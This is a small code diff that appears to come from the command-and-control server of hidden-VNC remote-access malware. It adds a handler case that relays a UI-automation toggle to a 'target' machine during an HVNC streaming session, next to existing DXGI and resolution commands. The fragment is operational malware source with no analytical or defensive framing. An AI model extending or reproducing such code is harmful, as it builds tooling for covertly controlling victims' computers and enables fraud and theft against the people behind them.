@@ -840,6 +840,9 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
     case "hvnc_enable_dxgi":
       if (state.isStreaming) sendHVNCCommand(target, "hvnc_enable_dxgi", { enabled: !!payload.enabled });
       break;
+    case "hvnc_enable_uia":
+      if (state.isStreaming) sendHVNCCommand(target, "hvnc_enable_uia", { enabled: !!payload.enabled });
+      break;
     case "hvnc_set_resolution": {
       const maxHeight = Number(payload.maxHeight) || 0;
       if (state.isStreaming) sendHVNCCommand(target, "hvnc_set_resolution", { maxHeight });
